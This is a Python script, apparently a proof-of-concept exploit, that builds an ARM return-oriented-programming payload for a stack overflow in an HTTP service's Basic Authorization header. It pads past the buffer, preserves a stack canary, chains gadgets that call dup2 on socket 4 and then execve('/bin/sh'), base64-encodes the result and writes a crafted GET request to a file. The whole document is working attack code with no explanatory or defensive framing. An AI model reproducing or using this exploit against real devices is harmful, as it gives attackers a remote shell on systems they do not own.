from base64 import b64encode
from struct import pack

p = 'a:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'

# Need this value to preserve canary
p += pack('<I', 0x01000000)

# dup2(4, 0)
p += pack('<I', 0x00028947) # pop {r0, pc}
p += pack('<I', 0x00000004) # 4
p += pack('<I', 0x00067037) # pop {r1, pc}
p += pack('<I', 0x00000000) # 0
p += pack('<I', 0x00019be7) # pop {r7, pc}
p += pack('<I', 0x0000003f) # 63
p += pack('<I', 0x00019be5) # svc #0 ; pop {r7} ;
p += pack('<I', 0x00000000) # 0

# dup2(4, 1)
p += pack('<I', 0x00028947) # pop {r0, pc}
p += pack('<I', 0x00000004) # 4
p += pack('<I', 0x00067037) # pop {r1, pc}
p += pack('<I', 0x00000001) # 1
p += pack('<I', 0x00019be7) # pop {r7, pc}
p += pack('<I', 0x0000003f) # 63
p += pack('<I', 0x00019be5) # svc #0 ; pop {r7} ;
p += pack('<I', 0x00000000) # 0

# dup2(4, 2)
p += pack('<I', 0x00028947) # pop {r0, pc}
p += pack('<I', 0x00000004) # 4
p += pack('<I', 0x00067037) # pop {r1, pc}
p += pack('<I', 0x00000002) # 2
p += pack('<I', 0x00019be7) # pop {r7, pc}
p += pack('<I', 0x0000003f) # 63
p += pack('<I', 0x00019be5) # svc #0 ; pop {r7} ;
p += pack('<I', 0x00000000) # 0

# execve
p += pack('<I', 0x000117b5) # pop {r4, pc}
p += pack('<I', 0x0002a8ad)
p += pack('<I', 0x00052cab) # add r1, sp, #0x2c ; mov r2, r7 ; blx r4
p += pack('<I', 0x0006c454) # "/bin/sh"
p += pack('<I', 0x0000000b) # syscall number for execve
p += pack('<I', 0x00019be5) # svc #0 ; pop {r7, pc}
p += pack('<I', 0x00000000) # 0
p += pack('<I', 0x0006c454) # "/bin/sh"
p += pack('<I', 0x00000000)
p += pack('<I', 0x00000000)
p += pack('<I', 0x00000000)
p += pack('<I', 0x00000000)
p += pack('<I', 0x00000000)
p += pack('<I', 0x0006c454) # "/bin/sh"

p = b64encode(p).decode('ascii')

# Create request text
req = 'GET / HTTP/1.1\n'
req += 'Host: 192.168.178.121:1080\n'
req += 'Authorization: Basic '
req += p
req += '\n'
req += 'User-Agent: curl/7.51.0\n'
req += 'Accept: /\n\n'

data = open('request.data', 'wb')
data.write(req)
data.close()
